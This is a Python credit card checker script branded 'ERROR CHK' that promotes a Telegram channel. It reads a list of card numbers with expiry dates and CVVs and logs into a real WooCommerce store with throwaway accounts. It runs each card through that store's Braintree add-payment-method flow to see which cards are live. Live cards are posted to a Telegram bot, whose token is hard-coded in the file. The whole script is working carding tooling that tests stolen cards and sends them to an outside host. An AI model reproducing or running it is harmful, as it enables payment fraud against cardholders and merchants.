import requests
import requests
import re
import requests
import requests,time
import random
import requests
import re,json
import random
import time
import string
import base64
from bs4 import BeautifulSoup
from user_agent import *
import random
import string
import requests
import requests,user_agent,re,base64,json,random
import requests
import pyfiglet
import time
import os
import webbrowser
from colorama import Fore
import string
from getuseragent import UserAgent
Z =  '\033[1;31m' 
F = '\033[2;32m' 
B = '\033[2;36m'
X = '\033[1;33m' 
C = '\033[2;35m'
W=Fore.WHITE
L=Fore.BLUE
print(Z+"□■"*30)

ascii_art = pyfiglet.figlet_format("   ERROR CHK ")
print(L+ ascii_art)
print(F+"□■"*30)
webbrowser.open('https://t.me/ERR0R9')
print('\t\033[1;31m>>> Join Me Channel @ERR0R9 ');
print('\t\x1b[38;5;153m @ERR0R9<--');
o=("------------------------------------------------------------")
print(B+o)
combo=input(X+'card.txt:'+X)
y=open(f'{combo}',"+r")
token = input('6108245788:AAHXlyWXUms8KnREtQIFLc5AYro2ikzv_A8')
start_num = 0
F = '\033[2;32m'
Z= '\033[2;31m'
for y in y:
	start_num += 1
	ccx = y.strip().split('\n')[0]
	c = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:
		yy = yy.split("20")[1]
	acc = ['jabapaj169@givehit.com', 'sehawo9267@polatrix.com','paxibo6273@iteradev.com','vecero7501@segichen.com']
	email = random.choice(acc)
	print(F+email)
	user = user_agent.generate_user_agent()
	r = requests.session()
	headers = {'user-agent': user}
	response = r.post(
	    'https://atrantil.com/my-account/add-payment-method/', headers=headers)
	nonce = (re.search(r'name="woocommerce-login-nonce" value="(.*?)"', response.text).group(1))
	data = {
    'username': email,
    'password': 'A@Amir5520055',
    'wpa_initiator': '',
    'alt_s': '',
    'udwsno9687': '828176',
    'woocommerce-login-nonce': nonce,
    '_wp_http_referer': '/my-account/add-payment-method/',
    'login': 'Log in',
    'ct_bot_detector_event_token': 'bad77f24b9ad40433de7effd7f8a8ea7a9c0cdd28635f17c1337ffd7f1828aa4',
}
	
	response = r.post(
	    'https://atrantil.com/my-account/add-payment-method/',
	    cookies=r.cookies,
	    headers=headers,
	    data=data,
	)
	nonce=re.findall(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"',response.text)[0]
	enc = re.search(r'var wc_braintree_client_token = \["(.*?)"\];', response.text).group(1)
	dec = base64.b64decode(enc).decode('utf-8')
	au=re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]
	nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
	headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
    'authorization': f'Bearer {au}',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': 'd251affb-6b72-4cfd-b93e-db6cb20bcd10',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': c,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
                'billingAddress': {
                    'postalCode': '10080',
                    'streetAddress': '323 E Pine St',
                },
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	tok = response.json()['data']['tokenizeCreditCard']['token']
	import requests
	headers = {'user-agent': user}
	
	data = {
	    'payment_method': 'braintree_cc',
    'braintree_cc_nonce_key': tok,
    'braintree_cc_device_data': '{"device_session_id":"4a22481c8661fe4dad5bbd95a7081548","fraud_merchant_id":null,"correlation_id":"c65afe459618e3fa0114dabd2c40d90a"}',
    'braintree_cc_3ds_nonce_key': '',
    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/h6nck7m2yyh6mqk4/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/h6nck7m2yyh6mqk4"},"merchantId":"h6nck7m2yyh6mqk4","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"applePayWeb":{"countryCode":"US","currencyCode":"USD","merchantIdentifier":"h6nck7m2yyh6mqk4","supportedNetworks":["visa","mastercard","amex","discover"]},"kount":{"kountMerchantId":null},"challenges":["cvv","postal_code"],"creditCards":{"supportedCardTypes":["MasterCard","Visa","Discover","JCB","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"payWithVenmo":{"merchantId":"3333843690920608617","accessToken":"access_token$production$h6nck7m2yyh6mqk4$c17263feed9f66d5cc7e08f975927dd8","environment":"production","enrichedCustomerDataEnabled":false},"paypalEnabled":true,"paypal":{"displayName":"KBS Research","clientId":"AZ2WICgQ3fCYcNKRNgw9m3wd5_brlV542A4KeOL3mkkw11N4itXNyWxL_R7KGD0tX8Ssa3bEiyGG10gc","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"kbsresearch_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
    'woocommerce-add-payment-method-nonce': nonce,
    '_wp_http_referer': '/my-account/add-payment-method/',
    'woocommerce_add_payment_method': '1',
    'ct_bot_detector_event_token': 'bad77f24b9ad40433de7effd7f8a8ea7a9c0cdd28635f17c1337ffd7f1828aa4',
    'apbct_visible_fields': 'eyIwIjp7InZpc2libGVfZmllbGRzIjoiIiwidmlzaWJsZV9maWVsZHNfY291bnQiOjAsImludmlzaWJsZV9maWVsZHMiOiJicmFpbnRyZWVfY2Nfbm9uY2Vfa2V5IGJyYWludHJlZV9jY19kZXZpY2VfZGF0YSBicmFpbnRyZWVfY2NfM2RzX25vbmNlX2tleSBicmFpbnRyZWVfY2NfY29uZmlnX2RhdGEgd29vY29tbWVyY2UtYWRkLXBheW1lbnQtbWV0aG9kLW5vbmNlIF93cF9odHRwX3JlZmVyZXIgd29vY29tbWVyY2VfYWRkX3BheW1lbnRfbWV0aG9kIGN0X2JvdF9kZXRlY3Rvcl9ldmVudF90b2tlbiIsImludmlzaWJsZV9maWVsZHNfY291bnQiOjh9fQ==',
}
	
	response = r.post(
	    'https://atrantil.com/my-account/add-payment-method/',
	    cookies=r.cookies,
	    headers=headers,
	    data=data,
	)
	text = response.text
	pattern = r'Reason: (.+?)\s*</li>'
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
		#print(result) 
	else:
		if 'Payment method successfully added.' in text:
			result = "1000: Approved"
		elif 'risk_threshold' in text:
			result = "RISK: Retry this BIN later."
		elif 'Please wait for 20 seconds.' in text:
			time.sleep(5)
			result = "try again"
		else:
			result = "Error"
			#print('er#')
	if 'avs' in result or '1000: Approved' in result or 'Duplicate' in result or 'Insufficient Funds' in result or 'Invalid postal code' in result:
	    print(f'[{start_num}] {ccx} >> {result}✅')
	    requests.post(f"""https://api.telegram.org/bot{token}/sendmessage?chat_id={ID}&text=
𝗖𝗮𝗿𝗱 -» {ccx}
         
𝗚𝗮𝘁𝗲𝘄𝗮𝘆  -» 𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗔𝗨𝗧𝗛
 
𝗥𝗲𝘀??𝗼𝗻𝘀𝗲 -» 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅
         
𝗕𝗬 :『@ERR0R9』""")

	else:
	    print(f'{Z}[{start_num}] {ccx} >> {result}❌')
	time.sleep(5)
6
